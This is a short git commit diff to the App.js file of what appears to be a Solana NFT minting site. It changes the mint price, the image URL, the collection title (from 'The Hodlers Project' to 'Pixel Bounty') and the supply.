71f34d916ec502b2ffc98c086b700417f53ce63d
SDEEY <75689630+SDEEY@users.noreply.github.com>
2022-04-09 22:41:43 +0500

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,10 +4,10 @@ import * as solanaWeb3 from "@solana/web3.js";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = 0.35
-const image = 'https://pbs.twimg.com/profile_images/1496414272284409860/HScJMilz_400x400.jpg' 
-const Title = 'The Hodlers Project'
-const supply = 1111
+const solAmount = 0.09
+const image = 'https://media.discordapp.net/attachments/906904143761920010/962405671754666004/16495257886148871218703296233726.jpg' 
+const Title = 'Pixel Bounty'
+const supply = 555
 
 document.title = Title
 
